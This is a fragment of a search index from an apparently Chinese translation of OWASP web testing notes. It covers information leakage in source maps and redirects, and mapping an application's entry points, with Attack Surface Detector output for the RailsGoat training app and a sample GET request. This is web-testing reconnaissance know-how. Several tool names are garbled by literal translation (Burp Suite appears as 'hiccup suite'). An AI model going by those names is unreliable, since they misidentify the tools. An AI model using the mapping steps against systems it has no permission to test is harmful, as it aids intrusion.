<p>\u5f53\u7f51\u7ad9\u52a0\u8f7d\u6e90\u6620\u5c04\u6587\u4ef6\u65f6\uff0c\u524d\u7aef\u6e90\u4ee3\u7801\u5c06\u53d8\u5f97\u53ef\u8bfb\u4e14\u66f4\u6613\u4e8e\u8c03\u8bd5\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.5%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_6","title":"\u8bc6\u522b\u6cc4\u6f0f\u4fe1\u606f\u7684\u91cd\u5b9a\u5411\u54cd\u5e94","text":"<p>\u5c3d\u7ba1\u91cd\u5b9a\u5411\u54cd\u5e94\u901a\u5e38\u4e0d\u4f1a\u5305\u542b\u4efb\u4f55\u91cd\u8981\u7684 Web \u5185\u5bb9\uff0c\u4f46\u4e0d\u80fd\u4fdd\u8bc1\u5b83\u4eec\u4e0d\u4f1a\u5305\u542b\u4efb\u4f55\u5185\u5bb9\u3002\u56e0\u6b64\uff0c\u867d\u7136 300 \u7cfb\u5217\uff08\u91cd\u5b9a\u5411\uff09\u54cd\u5e94\u901a\u5e38\u5305\u542b\u201c\u91cd\u5b9a\u5411\u5230<code>https://example.com/</code>\u201d\u7c7b\u578b\u7684\u5185\u5bb9\uff0c\u4f46\u5b83\u4eec\u4e5f\u53ef\u80fd\u4f1a\u6cc4\u9732\u5185\u5bb9\u3002</p> <p>\u8003\u8651\u91cd\u5b9a\u5411\u54cd\u5e94\u662f\u8eab\u4efd\u9a8c\u8bc1\u6216\u6388\u6743\u68c0\u67e5\u7684\u7ed3\u679c\u7684\u60c5\u51b5\uff0c\u5982\u679c\u8be5\u68c0\u67e5\u5931\u8d25\uff0c\u670d\u52a1\u5668\u53ef\u80fd\u4f1a\u54cd\u5e94\u5c06\u7528\u6237\u91cd\u5b9a\u5411\u56de\u201c\u5b89\u5168\u201d\u6216\u201c\u9ed8\u8ba4\u201d\u9875\u9762\uff0c\u4f46\u91cd\u5b9a\u5411\u54cd\u5e94\u672c\u8eab\u53ef\u80fd\u4ecd\u5305\u542b\u5185\u5bb9\u5b83\u6ca1\u6709\u5728\u6d4f\u89c8\u5668\u4e2d\u663e\u793a\uff0c\u4f46\u786e\u5b9e\u4f20\u8f93\u7ed9\u4e86\u5ba2\u6237\u7aef\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u5229\u7528\u6d4f\u89c8\u5668\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u6216\u901a\u8fc7\u4e2a\u4eba\u4ee3\u7406\uff08\u4f8b\u5982 ZAP\u3001Burp\u3001Fiddler \u6216 Charles\uff09\u6765\u5b9e\u73b0\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.5%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_7","title":"\u5de5\u5177","text":"<ul> <li>Wget</li> <li>\u6d4f\u89c8\u5668\u201c\u67e5\u770b\u6e90\u4ee3\u7801\u201d\u529f\u80fd</li> <li>\u773c\u7403</li> <li>\u5377\u66f2</li> <li>Zaproxy</li> <li>\u6253\u55dd\u5957\u4ef6</li> <li>\u8fd4\u56de\u7f51\u5740</li> <li>\u8c37\u6b4c\u5730\u56fe API \u626b\u63cf\u4eea</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.5%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_8","title":"\u53c2\u8003","text":"<ul> <li>\u94a5\u5319\u9ed1\u5ba2</li> <li>RingZer0 \u5728\u7ebf CTF\u00a0- \u6311\u6218 104 \u201c\u7ba1\u7406\u9762\u677f\u201d\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.5%E5%AE%A1%E6%9F%A5%E7%BD%91%E9%A1%B5%E5%86%85%E5%AE%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#_9","title":"\u767d\u76ae\u4e66","text":"<ul> <li>HTML \u7248\u672c 4.01</li> <li>XHTML</li> <li>HTML \u7248\u672c 5</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.6%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/","title":"1.6\u786e\u5b9a\u5e94\u7528\u5165\u53e3\u70b9","text":""},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.6%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_1","title":"\u6982\u62ec","text":"<p>\u5728\u8fdb\u884c\u4efb\u4f55\u5f7b\u5e95\u7684\u6d4b\u8bd5\u4e4b\u524d\uff0c\u679a\u4e3e\u5e94\u7528\u7a0b\u5e8f\u53ca\u5176\u653b\u51fb\u9762\u662f\u4e00\u4e2a\u5173\u952e\u7684\u5148\u51b3\u6761\u4ef6\uff0c\u56e0\u4e3a\u5b83\u5141\u8bb8\u6d4b\u8bd5\u4eba\u5458\u8bc6\u522b\u53ef\u80fd\u7684\u5f31\u70b9\u533a\u57df\u3002\u672c\u8282\u65e8\u5728\u5e2e\u52a9\u8bc6\u522b\u548c\u6620\u5c04\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u533a\u57df\uff0c\u4e00\u65e6\u679a\u4e3e\u548c\u6620\u5c04\u5b8c\u6210\u540e\u5e94\u8fdb\u884c\u8c03\u67e5\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.6%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_2","title":"\u6d4b\u8bd5\u76ee\u6807","text":"<ul> <li>\u901a\u8fc7\u8bf7\u6c42\u548c\u54cd\u5e94\u5206\u6790\u786e\u5b9a\u53ef\u80fd\u7684\u5165\u53e3\u548c\u6ce8\u5165\u70b9\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.6%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_3","title":"\u5982\u4f55\u6d4b\u8bd5","text":"<p>\u5728\u5f00\u59cb\u4efb\u4f55\u6d4b\u8bd5\u4e4b\u524d\uff0c\u6d4b\u8bd5\u4eba\u5458\u5e94\u8be5\u59cb\u7ec8\u5f88\u597d\u5730\u4e86\u89e3\u5e94\u7528\u7a0b\u5e8f\uff0c\u4ee5\u53ca\u7528\u6237\u548c\u6d4f\u89c8\u5668\u5982\u4f55\u4e0e\u4e4b\u901a\u4fe1\u3002\u5f53\u6d4b\u8bd5\u4eba\u5458\u904d\u5386\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u4ed6\u4eec\u5e94\u8be5\u6ce8\u610f\u6240\u6709 HTTP \u8bf7\u6c42\u4ee5\u53ca\u4f20\u9012\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2a\u53c2\u6570\u548c\u8868\u5355\u5b57\u6bb5\u3002\u4ed6\u4eec\u5e94\u7279\u522b\u6ce8\u610f\u4f55\u65f6\u4f7f\u7528 GET \u8bf7\u6c42\u4ee5\u53ca\u4f55\u65f6\u4f7f\u7528 POST \u8bf7\u6c42\u5411\u5e94\u7528\u7a0b\u5e8f\u4f20\u9012\u53c2\u6570\u3002\u6b64\u5916\uff0c\u4ed6\u4eec\u8fd8\u9700\u8981\u6ce8\u610f\u4f55\u65f6\u4f7f\u7528\u5176\u4ed6\u7528\u4e8e RESTful \u670d\u52a1\u7684\u65b9\u6cd5\u3002</p> <p>\u8bf7\u6ce8\u610f\uff0c\u4e3a\u4e86\u67e5\u770b\u5728\u8bf7\u6c42\u6b63\u6587\uff08\u4f8b\u5982 POST \u8bf7\u6c42\uff09\u4e2d\u53d1\u9001\u7684\u53c2\u6570\uff0c\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u9700\u8981\u4f7f\u7528\u8bf8\u5982\u62e6\u622a\u4ee3\u7406\u4e4b\u7c7b\u7684\u5de5\u5177\uff08\u8bf7\u53c2\u9605\u5de5\u5177\uff09\u3002\u5728 POST \u8bf7\u6c42\u4e2d\uff0c\u6d4b\u8bd5\u4eba\u5458\u8fd8\u5e94\u8be5\u7279\u522b\u6ce8\u610f\u4f20\u9012\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u4efb\u4f55\u9690\u85cf\u8868\u5355\u5b57\u6bb5\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u901a\u5e38\u5305\u542b\u654f\u611f\u4fe1\u606f\uff0c\u4f8b\u5982\u72b6\u6001\u4fe1\u606f\u3001\u9879\u76ee\u6570\u91cf\u3001\u9879\u76ee\u4ef7\u683c\uff0c\u5f00\u53d1\u4eba\u5458\u6c38\u8fdc\u4e0d\u4f1a\u65e8\u5728\u4f9b\u4efb\u4f55\u4eba\u67e5\u770b\u6216\u66f4\u6539\u3002</p> <p>\u6839\u636e\u4f5c\u8005\u7684\u7ecf\u9a8c\uff0c\u5728\u8fd9\u4e2a\u6d4b\u8bd5\u9636\u6bb5\u4f7f\u7528\u62e6\u622a\u4ee3\u7406\u548c\u7535\u5b50\u8868\u683c\u975e\u5e38\u6709\u7528\u3002\u4ee3\u7406\u5c06\u5728\u6d4b\u8bd5\u4eba\u5458\u63a2\u7d22\u5e94\u7528\u7a0b\u5e8f\u65f6\u8ddf\u8e2a\u6d4b\u8bd5\u4eba\u5458\u548c\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u7684\u6bcf\u4e2a\u8bf7\u6c42\u548c\u54cd\u5e94\u3002\u6b64\u5916\uff0c\u5728\u8fd9\u4e00\u70b9\u4e0a\uff0c\u6d4b\u8bd5\u4eba\u5458\u901a\u5e38\u4f1a\u6355\u83b7\u6bcf\u4e2a\u8bf7\u6c42\u548c\u54cd\u5e94\uff0c\u4ee5\u4fbf\u4ed6\u4eec\u53ef\u4ee5\u51c6\u786e\u5730\u770b\u5230\u4f20\u9012\u7ed9\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2a\u6807\u5934\u3001\u53c2\u6570\u7b49\u4ee5\u53ca\u8fd4\u56de\u7684\u5185\u5bb9\u3002\u8fd9\u6709\u65f6\u4f1a\u975e\u5e38\u4e4f\u5473\uff0c\u5c24\u5176\u662f\u5728\u5927\u578b\u4ea4\u4e92\u5f0f\u7f51\u7ad9\u4e0a\uff08\u60f3\u60f3\u94f6\u884c\u5e94\u7528\u7a0b\u5e8f\uff09\u3002\u7136\u800c\uff0c\u7ecf\u9a8c\u4f1a\u544a\u8bc9\u6211\u4eec\u8981\u5bfb\u627e\u4ec0\u4e48\uff0c\u8fd9\u4e2a\u9636\u6bb5\u53ef\u4ee5\u5927\u5927\u51cf\u5c11\u3002</p> <p>\u5f53\u6d4b\u8bd5\u4eba\u5458\u904d\u5386\u5e94\u7528\u7a0b\u5e8f\u65f6\uff0c\u4ed6\u4eec\u5e94\u8be5\u8bb0\u4e0b URL\u3001\u81ea\u5b9a\u4e49\u6807\u5934\u6216\u8bf7\u6c42/\u54cd\u5e94\u6b63\u6587\u4e2d\u7684\u4efb\u4f55\u6709\u8da3\u53c2\u6570\uff0c\u5e76\u5c06\u5b83\u4eec\u4fdd\u5b58\u5728\u7535\u5b50\u8868\u683c\u4e2d\u3002\u7535\u5b50\u8868\u683c\u5e94\u5305\u62ec\u8bf7\u6c42\u7684\u9875\u9762\uff08\u6700\u597d\u8fd8\u6dfb\u52a0\u6765\u81ea\u4ee3\u7406\u7684\u8bf7\u6c42\u7f16\u53f7\uff0c\u4ee5\u4f9b\u5c06\u6765\u53c2\u8003\uff09\u3001\u6709\u8da3\u7684\u53c2\u6570\u3001\u8bf7\u6c42\u7c7b\u578b\uff08GET\u3001POST \u7b49\uff09\uff0c\u5982\u679c\u8bbf\u95ee\u662f\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1/\u672a\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\uff0c\u5982\u679c\u4f7f\u7528 TLS\uff0c\u5982\u679c\u5b83\u662f\u591a\u6b65\u9aa4\u8fc7\u7a0b\u7684\u4e00\u90e8\u5206\uff0c\u5982\u679c\u4f7f\u7528 WebSockets\uff0c\u4ee5\u53ca\u4efb\u4f55\u5176\u4ed6\u76f8\u5173\u8bf4\u660e\u3002\u4e00\u65e6\u4ed6\u4eec\u89c4\u5212\u4e86\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2a\u533a\u57df\uff0c\u4ed6\u4eec\u5c31\u53ef\u4ee5\u68c0\u67e5\u5e94\u7528\u7a0b\u5e8f\u5e76\u6d4b\u8bd5\u4ed6\u4eec\u5df2\u7ecf\u786e\u5b9a\u7684\u6bcf\u4e2a\u533a\u57df\uff0c\u5e76\u8bb0\u5f55\u54ea\u4e9b\u6709\u6548\uff0c\u54ea\u4e9b\u65e0\u6548\u3002\u672c\u6307\u5357\u7684\u5176\u4f59\u90e8\u5206\u5c06\u786e\u5b9a\u5982\u4f55\u6d4b\u8bd5\u6bcf\u4e2a\u611f\u5174\u8da3\u7684\u9886\u57df\uff0c</p> <p>\u4ee5\u4e0b\u662f\u6240\u6709\u8bf7\u6c42\u548c\u54cd\u5e94\u7684\u4e00\u4e9b\u8981\u70b9\u3002\u5728\u8bf7\u6c42\u90e8\u5206\uff0c\u91cd\u70b9\u5173\u6ce8 GET \u548c POST \u65b9\u6cd5\uff0c\u56e0\u4e3a\u5b83\u4eec\u51fa\u73b0\u5728\u5927\u591a\u6570\u8bf7\u6c42\u4e2d\u3002\u8bf7\u6ce8\u610f\uff0c\u53ef\u4ee5\u4f7f\u7528\u5176\u4ed6\u65b9\u6cd5\uff0c\u4f8b\u5982 PUT \u548c DELETE\u3002\u901a\u5e38\uff0c\u5982\u679c\u5141\u8bb8\uff0c\u8fd9\u4e9b\u66f4\u7f55\u89c1\u7684\u8bf7\u6c42\u53ef\u80fd\u4f1a\u66b4\u9732\u6f0f\u6d1e\u3002\u672c\u6307\u5357\u4e2d\u6709\u4e00\u4e2a\u4e13\u95e8\u7528\u4e8e\u6d4b\u8bd5\u8fd9\u4e9b HTTP \u65b9\u6cd5\u7684\u90e8\u5206\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.6%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_4","title":"\u8981\u6c42","text":"<ul> <li>\u786e\u5b9a\u5728\u4f55\u5904\u4f7f\u7528 GET \u548c\u5728\u4f55\u5904\u4f7f\u7528 POST\u3002</li> <li>\u8bc6\u522b POST \u8bf7\u6c42\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u53c2\u6570\uff08\u8fd9\u4e9b\u5728\u8bf7\u6c42\u7684\u6b63\u6587\u4e2d\uff09\u3002</li> <li>\u5728 POST \u8bf7\u6c42\u4e2d\uff0c\u8bf7\u7279\u522b\u6ce8\u610f\u4efb\u4f55\u9690\u85cf\u53c2\u6570\u3002\u53d1\u9001 POST \u65f6\uff0c\u6240\u6709\u8868\u5355\u5b57\u6bb5\uff08\u5305\u62ec\u9690\u85cf\u53c2\u6570\uff09\u90fd\u5c06\u5728 HTTP \u6d88\u606f\u6b63\u6587\u4e2d\u53d1\u9001\u5230\u5e94\u7528\u7a0b\u5e8f\u3002\u8fd9\u4e9b\u901a\u5e38\u662f\u770b\u4e0d\u5230\u7684\uff0c\u9664\u975e\u4f7f\u7528\u4ee3\u7406\u6216\u67e5\u770b HTML \u6e90\u4ee3\u7801\u3002\u6b64\u5916\uff0c\u663e\u793a\u7684\u4e0b\u4e00\u9875\u3001\u5176\u6570\u636e\u548c\u8bbf\u95ee\u7ea7\u522b\u90fd\u53ef\u80fd\u56e0\u9690\u85cf\u53c2\u6570\u7684\u503c\u800c\u5f02\u3002</li> <li>\u8bc6\u522b GET \u8bf7\u6c42\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u53c2\u6570\uff08\u5373 URL\uff09\uff0c\u7279\u522b\u662f\u67e5\u8be2\u5b57\u7b26\u4e32\uff08\u901a\u5e38\u5728 ? \u6807\u8bb0\u4e4b\u540e\uff09\u3002</li> <li>\u8bc6\u522b\u67e5\u8be2\u5b57\u7b26\u4e32\u7684\u6240\u6709\u53c2\u6570\u3002\u8fd9\u4e9b\u901a\u5e38\u662f\u6210\u5bf9\u683c\u5f0f\uff0c\u4f8b\u5982<code>foo=bar</code>.\u00a0\u53e6\u8bf7\u6ce8\u610f\uff0c\u8bb8\u591a\u53c2\u6570\u53ef\u4ee5\u5728\u4e00\u4e2a\u67e5\u8be2\u5b57\u7b26\u4e32\u4e2d\uff0c\u4f8b\u5982\u7531<code>&amp;</code>,\u00a0<code>\\~</code>,<code>:</code>\u6216\u4efb\u4f55\u5176\u4ed6\u7279\u6b8a\u5b57\u7b26\u6216\u7f16\u7801\u5206\u9694\u3002</li> <li>\u5728\u8bc6\u522b\u4e00\u4e2a\u5b57\u7b26\u4e32\u6216 POST \u8bf7\u6c42\u4e2d\u7684\u591a\u4e2a\u53c2\u6570\u65f6\u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0c\u6267\u884c\u653b\u51fb\u9700\u8981\u90e8\u5206\u6216\u5168\u90e8\u53c2\u6570\u3002\u6d4b\u8bd5\u4eba\u5458\u9700\u8981\u8bc6\u522b\u6240\u6709\u53c2\u6570\uff08\u5373\u4f7f\u5df2\u7f16\u7801\u6216\u52a0\u5bc6\uff09\u5e76\u8bc6\u522b\u54ea\u4e9b\u53c2\u6570\u7531\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\u3002\u6307\u5357\u7684\u540e\u9762\u90e8\u5206\u5c06\u786e\u5b9a\u5982\u4f55\u6d4b\u8bd5\u8fd9\u4e9b\u53c2\u6570\u3002\u5728\u8fd9\u4e00\u70b9\u4e0a\uff0c\u53ea\u9700\u786e\u4fdd\u5b83\u4eec\u4e2d\u7684\u6bcf\u4e00\u4e2a\u90fd\u88ab\u8bc6\u522b\u51fa\u6765\u3002</li> <li>\u8fd8\u8981\u6ce8\u610f\u901a\u5e38\u770b\u4e0d\u5230\u7684\u4efb\u4f55\u5176\u4ed6\u6216\u81ea\u5b9a\u4e49\u7c7b\u578b\u6807\u5934\uff08\u4f8b\u5982<code>debug: false</code>\uff09\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.6%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_5","title":"\u56de\u5e94","text":"<ul> <li>\u786e\u5b9a\u65b0 cookie \u7684\u8bbe\u7f6e\uff08<code>Set-Cookie</code>\u6807\u5934\uff09\u3001\u4fee\u6539\u6216\u6dfb\u52a0\u4f4d\u7f6e\u3002</li> <li>\u786e\u5b9a\u5728\u6b63\u5e38\u54cd\u5e94\uff08\u5373\u672a\u4fee\u6539\u7684\u8bf7\u6c42\uff09\u671f\u95f4\u5b58\u5728\u4efb\u4f55\u91cd\u5b9a\u5411\uff083xx HTTP \u72b6\u6001\u4ee3\u7801\uff09\u3001400 \u72b6\u6001\u4ee3\u7801\uff08\u5c24\u5176\u662f 403 Forbidden\uff09\u548c 500 \u5185\u90e8\u670d\u52a1\u5668\u9519\u8bef\u7684\u4f4d\u7f6e\u3002</li> <li>\u8fd8\u8981\u6ce8\u610f\u4f7f\u7528\u4efb\u4f55\u6709\u8da3\u7684\u6807\u5934\u7684\u4f4d\u7f6e\u3002\u4f8b\u5982\uff0c<code>Server: BIG-IP</code>\u8868\u793a\u8be5\u7ad9\u70b9\u662f\u8d1f\u8f7d\u5e73\u8861\u7684\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4e00\u4e2a\u7ad9\u70b9\u662f\u8d1f\u8f7d\u5e73\u8861\u7684\u5e76\u4e14\u4e00\u53f0\u670d\u52a1\u5668\u914d\u7f6e\u4e0d\u6b63\u786e\uff0c\u90a3\u4e48\u6d4b\u8bd5\u4eba\u5458\u53ef\u80fd\u4e0d\u5f97\u4e0d\u53d1\u51fa\u591a\u4e2a\u8bf7\u6c42\u6765\u8bbf\u95ee\u6613\u53d7\u653b\u51fb\u7684\u670d\u52a1\u5668\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u6240\u4f7f\u7528\u7684\u8d1f\u8f7d\u5e73\u8861\u7c7b\u578b\u3002</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.6%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#owasp","title":"OWASP \u653b\u51fb\u9762\u68c0\u6d4b\u5668","text":"<p>Attack Surface Detector (ASD) \u5de5\u5177\u8c03\u67e5\u6e90\u4ee3\u7801\u5e76\u53d1\u73b0 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u7aef\u70b9\u3001\u8fd9\u4e9b\u7aef\u70b9\u63a5\u53d7\u7684\u53c2\u6570\u4ee5\u53ca\u8fd9\u4e9b\u53c2\u6570\u7684\u6570\u636e\u7c7b\u578b\u3002\u8fd9\u5305\u62ec\u8718\u86db\u65e0\u6cd5\u627e\u5230\u7684\u672a\u94fe\u63a5\u7aef\u70b9\uff0c\u6216\u5ba2\u6237\u7aef\u4ee3\u7801\u4e2d\u5b8c\u5168\u672a\u4f7f\u7528\u7684\u53ef\u9009\u53c2\u6570\u3002\u5b83\u8fd8\u80fd\u591f\u8ba1\u7b97\u5e94\u7528\u7a0b\u5e8f\u4e24\u4e2a\u7248\u672c\u4e4b\u95f4\u653b\u51fb\u9762\u7684\u53d8\u5316\u3002</p> <p>Attack Surface Detector \u53ef\u4f5c\u4e3a ZAP \u548c Burp Suite \u7684\u63d2\u4ef6\u4f7f\u7528\uff0c\u8fd8\u63d0\u4f9b\u547d\u4ee4\u884c\u5de5\u5177\u3002\u547d\u4ee4\u884c\u5de5\u5177\u5c06\u653b\u51fb\u9762\u5bfc\u51fa\u4e3a JSON \u8f93\u51fa\uff0c\u7136\u540e\u53ef\u4f9b ZAP \u548c Burp Suite \u63d2\u4ef6\u4f7f\u7528\u3002\u8fd9\u5bf9\u4e8e\u672a\u76f4\u63a5\u5411\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u63d0\u4f9b\u6e90\u4ee3\u7801\u7684\u60c5\u51b5\u5f88\u6709\u5e2e\u52a9\u3002\u4f8b\u5982\uff0c\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u53ef\u4ee5\u4ece\u4e0d\u60f3\u63d0\u4f9b\u6e90\u4ee3\u7801\u7684\u5ba2\u6237\u90a3\u91cc\u83b7\u53d6 json \u8f93\u51fa\u6587\u4ef6\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.6%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_6","title":"\u5982\u4f55\u4f7f\u7528","text":"<p>CLI jar \u6587\u4ef6\u53ef\u4ecehttps://github.com/secdec/attack-surface-detector-cli/releases\u4e0b\u8f7d\u3002</p> <p>\u60a8\u53ef\u4ee5\u4e3a ASD \u8fd0\u884c\u4ee5\u4e0b\u547d\u4ee4\uff0c\u4ee5\u4ece\u76ee\u6807 Web \u5e94\u7528\u7a0b\u5e8f\u7684\u6e90\u4ee3\u7801\u4e2d\u8bc6\u522b\u7aef\u70b9\u3002</p> <p><code>java -jar attack-surface-detector-cli-1.3.5.jar &lt;source-code-path&gt; [flags]</code></p> <p>\u8fd9\u662f\u9488\u5bf9OWASP RailsGoat\u8fd0\u884c\u547d\u4ee4\u7684\u793a\u4f8b\u3002</p> <pre><code>$ java -jar attack-surface-detector-cli-1.3.5.jar railsgoat/\nBeginning endpoint detection for '&lt;...&gt;/railsgoat' with 1 framework types\nUsing framework=RAILS\n[0] GET: /login (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_contro\nller.rb (lines '6'-'9')\n[1] GET: /logout (0 variants): PARAMETERS={}; FILE=/app/controllers/sessions_controller.rb (lines '33'-'37')\n[2] POST: /forgot_password (0 variants): PARAMETERS={email=name=email, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/\npassword_resets_controller.rb (lines '29'-'38')\n[3] GET: /password_resets (0 variants): PARAMETERS={token=name=token, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/p\nassword_resets_controller.rb (lines '19'-'27')\n[4] POST: /password_resets (0 variants): PARAMETERS={password=name=password, paramType=QUERY_STRING, dataType=STRING, user=name=user, paramType=QUERY_STRING, dataType=STRING, confirm_password=name=confirm_password, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/password_resets_controller.rb (lines '5'-'17')\n[5] GET: /sessions/new (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '6'-'9')\n[6] POST: /sessions (0 variants): PARAMETERS={password=name=password, paramType=QUERY_STRING, dataType=STRING, user_id=name=user_id, paramType=SESSION, dataType=STRING, remember_me=name=remember_me, paramType=QUERY_STRING, dataType=STRING, url=name=url, paramType=QUERY_STRING, dataType=STRING, email=name=email, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '11'-'31')\n[7] DELETE: /sessions/{id} (0 variants): PARAMETERS={}; FILE=/app/controllers/sessions_controller.rb (lines '33'-'37')\n[8] GET: /users (0 variants): PARAMETERS={}; FILE=/app/controllers/api/v1/users_controller.rb (lines '9'-'11')\n[9] GET: /users/{id} (0 variants): PARAMETERS={}; FILE=/app/controllers/api/v1/users_controller.rb (lines '13'-'15')\n... snipped ...\n[38] GET: /api/v1/mobile/{id} (0 variants): PARAMETERS={id=name=id, paramType=QUERY_STRING, dataType=STRING, class=name=class, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/api/v1/mobile_controller.rb (lines '8'-'13')\n[39] GET: / (0 variants): PARAMETERS={url=name=url, paramType=QUERY_STRING, dataType=STRING}; FILE=/app/controllers/sessions_controller.rb (lines '6'-'9')\nGenerated 40 distinct endpoints with 0 variants for a total of 40 endpoints\nSuccessfully validated serialization for these endpoints\n0 endpoints were missing code start line\n0 endpoints were missing code end line\n0 endpoints had the same code start and end line\nGenerated 36 distinct parameters\nGenerated 36 total parameters\n- 36/36 have their data type\n- 0/36 have a list of accepted values\n- 36/36 have their parameter type\n--- QUERY_STRING: 35\n--- SESSION: 1\nFinished endpoint detection for '&lt;...&gt;/railsgoat'\n----------\n-- DONE --\n0 projects had duplicate endpoints\nGenerated 40 distinct endpoints\nGenerated 40 total endpoints\nGenerated 36 distinct parameters\nGenerated 36 total parameters\n1/1 projects had endpoints generated\nTo enable logging include the -debug argument\n</code></pre> <p>\u60a8\u8fd8\u53ef\u4ee5\u4f7f\u7528<code>-json</code>\u6807\u5fd7\u751f\u6210\u4e00\u4e2a JSON \u8f93\u51fa\u6587\u4ef6\uff0c\u63d2\u4ef6\u53ef\u4ee5\u5c06\u5176\u7528\u4e8e ZAP \u548c Burp Suite\u3002\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u4ee5\u4e0b\u94fe\u63a5\u3002</p> <ul> <li>OWASP ZAP \u7684 ASD \u63d2\u4ef6\u4e3b\u9875</li> <li>PortSwigger Burp \u7684 ASD \u63d2\u4ef6\u4e3b\u9875</li> </ul>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.6%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#_7","title":"\u6d4b\u8bd5\u5e94\u7528\u7a0b\u5e8f\u5165\u53e3\u70b9","text":"<p>\u4ee5\u4e0b\u662f\u6709\u5173\u5982\u4f55\u68c0\u67e5\u5e94\u7528\u7a0b\u5e8f\u5165\u53e3\u70b9\u7684\u4e24\u4e2a\u793a\u4f8b\u3002</p>"},{"location":"OWASP%20WEB%20%E7%AC%94%E8%AE%B0/1.6%E7%A1%AE%E5%AE%9A%E5%BA%94%E7%94%A8%E5%85%A5%E5%8F%A3%E7%82%B9/#1","title":"\u793a\u4f8b 1","text":"<p>\u6b64\u793a\u4f8b\u663e\u793a\u4e86\u4e00\u4e2a GET \u8bf7\u6c42\uff0c\u8be5\u8bf7\u6c42\u5c06\u4ece\u5728\u7ebf\u8d2d\u7269\u5e94\u7528\u7a0b\u5e8f\u4e2d\u8d2d\u4e70\u5546\u54c1\u3002</p> <pre><code>GET\u00a0/shoppingApp/buyme.asp?CUSTOMERID=100&amp;ITEM=z101a&amp;PRICE=62.50&amp;IP=x.x.x.x HTTP/1.1\nHost:\u00a0x.x.x.x\nCookie:\u00a0SESSIONID=Z29vZCBqb2IgcGFkYXdhIG15IHVzZXJuYW1lIGlzIGZvbyBhbmQgcGFzc3dvcmQgaXMgYmFy\n</code></pre> 